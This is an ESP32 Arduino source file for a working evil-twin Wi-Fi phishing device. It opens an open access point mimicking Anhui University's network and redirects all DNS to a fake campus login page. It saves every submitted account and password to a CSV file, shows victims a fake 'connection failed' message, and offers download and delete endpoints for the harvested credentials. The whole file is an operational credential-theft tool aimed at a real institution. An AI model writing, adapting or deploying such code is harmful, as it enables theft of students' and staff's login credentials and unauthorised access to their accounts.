#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <esp_wifi.h>
#include <Adafruit_NeoPixel.h>
// AP配置
const char* AP_SSID = "ahu.portal";
const char* AP_PASSWORD = NULL;
const int AP_CHANNEL = 13;
// DNS和Web服务器
const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);

//rgb
#define LED_PIN 48         // 板载RGB灯珠的引脚，根据实际使用的开发板型号而定
#define LED_COUNT 1         // LED灯条的灯珠数量（板载的是一颗）

Adafruit_NeoPixel strip(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

// 门户页面HTML（单表单结构）
const char* portalPage = R"rawliteral(
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>安徽大学登录页</title>
    <style>
        body {
            background-color: white;
            color: black;
            margin: 0;
        }
        .container {
            width: 800px;
            margin: 0 auto;
            text-align: center;
            padding: 20px;
        }
        .input-set {
            margin-bottom: 10px;
        }
        button {
            background-color: green;
            color: white;
            padding: 5px 10px;
            margin-left: 10px;
            border: none;
            cursor: pointer;
        }
        ol {
            text-align: left;
            display: inline-block;
            margin: 20px 0;
        }
        .footer {
            font-size: small;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <img src="/ahu.jpg" alt="安徽大学" 
          style="width:100%; max-width:800px; height:auto; display:block; margin:0 auto;">
    <div class="container">
        <form method="POST" action="/submit">
            <div class="input-set">
                <label for="account">账号：</label>
                <input type="text" id="account" name="account">
                <button type="reset">重置</button>
            </div>
            <div class="input-set">
                <label for="password">密码：</label>
                <input type="password" id="password" name="password">
                <button type="submit">登录</button>
            </div>
        </form>
        <ol>
            <li>请输入网络账号，请输入您登录校内网络时的用户名；</li>
            <li>请输入网络密码，请输入您登录校内网络时的网络密码；</li>
            <li>报修电话：63861118</li>
        </ol>
        <div>
            <input type="checkbox" id="agree">
            <label for="agree">我已阅读并同意</label>
            <a href="#">免责声明</a>
        </div>
        <hr>
        <div class="footer">
            <p><strong style="word-spacing: 100px;">用户自助服务</strong>     <strong style="word-spacing: 100px;">数字安大</strong></p>
<p><strong style="word-spacing: 100px;">教务系统</strong>     <strong style="word-spacing: 100px;">一卡通电子服务大厅</strong></p>
            <p>本计费系统由广州热点软件科技股份有限公司提供</p>
        </div>
    </div>
</body>
</html>
)rawliteral";

// 改进后的提交处理函数
void handleSubmit() {
  String account = webServer.arg("account");
  String password = webServer.arg("password");

  Serial.printf("收到新数据：\n账号：%s\n密码：%s\n\n", account.c_str(), password.c_str());

  // 增强文件操作
  File file = SPIFFS.open("/data.csv", FILE_APPEND);
  if (!file) {
    Serial.println("文件打开失败！错误代码: " + String(file.getWriteError()));
    webServer.send(500, "text/plain", "服务器存储错误");
    return;
  }
  
  if (!file.printf("%lu,%s,%s\n", millis(), account.c_str(), password.c_str())) {
    Serial.println("写入失败！剩余空间: " + String(SPIFFS.totalBytes() - SPIFFS.usedBytes()) + " bytes");
    webServer.send(500, "text/plain", "写入失败");
  } else {
    Serial.println("数据已保存");
    strip.setPixelColor(0, strip.Color(0, 255, 0)); // 设置灯珠为绿色
    strip.setBrightness(10); // 设置亮度（0-255范围）
    strip.show();
    // webServer.send(200, "text/html; charset=utf-8", "<h2>愿者上钩！</h2><img src=\"/funny.jpg\" alt=\"joke\" style=\"width:100%; height:auto; object-fit: cover; max-height: auto;display:block;margin:0 auto\">");
    webServer.send(200, "text/html; charset=utf-8", "<h2>连接失败，请五分钟后稍后再试！</h2>");
    strip.setPixelColor(0, strip.Color(0, 255, 0)); // 设置灯珠为绿色
    strip.setBrightness(10); // 设置亮度（0-255范围）
    strip.show();
  }
  file.close();
}

// 新增文件管理功能
void handleDelete() {
  if (SPIFFS.remove("/data.csv")) {
    Serial.println("文件已删除");
    webServer.send(200, "text/plain; charset=utf-8", "文件已清除");
  } else {
    webServer.send(500, "text/plain; charset=utf-8", "删除失败");
  }
}

void setup() {
  Serial.begin(115200);

  strip.begin();
  strip.setBrightness(0); // 设置亮度（0-255范围）
  strip.show(); // 关闭所有灯珠

  // 增强SPIFFS初始化
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS初始化失败，尝试格式化...");
    SPIFFS.format();
    if (!SPIFFS.begin(true)) {
      Serial.println("格式化后仍无法挂载，请检查硬件");
      while (1);
    }
  }

  // 创建带BOM头的CSV文件（解决中文乱码）
  if (!SPIFFS.exists("/data.csv")) {
    File file = SPIFFS.open("/data.csv", FILE_WRITE);
    file.write(0xEF);
    file.write(0xBB);
    file.write(0xBF); // UTF-8 BOM
    file.println("时间戳,账号,密码");
    file.close();
  }

  // 启动AP
  WiFi.softAP(AP_SSID, AP_PASSWORD,AP_CHANNEL);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());
  esp_wifi_set_max_tx_power(82); // 设置最大发射功率
  // 配置服务器
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  webServer.on("/", []() { 
    webServer.send(200, "text/html; charset=utf-8", portalPage); 
  });
  
  webServer.on("/submit", HTTP_POST, handleSubmit);
  
  webServer.on("/download", []() {
    File file = SPIFFS.open("/data.csv", "r");
    if (file) {
      // 增加Content-Disposition头，使浏览器以附件形式下载CSV文件
      webServer.sendHeader("Content-Disposition", "attachment; filename=\"data.csv\"");
      webServer.streamFile(file, "text/csv; charset=utf-8");
      file.close();
    } else {
      webServer.send(404, "text/plain", "文件不存在");
    }
  });
  
  webServer.on("/delete", handleDelete);
  
  webServer.onNotFound([]() { 
    webServer.send(200, "text/html; charset=utf-8", portalPage); 
  });

  webServer.serveStatic("/ahu.jpg", SPIFFS, "/ahu.jpg");
  webServer.serveStatic("/funny.jpg", SPIFFS, "/funny.jpg");
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}


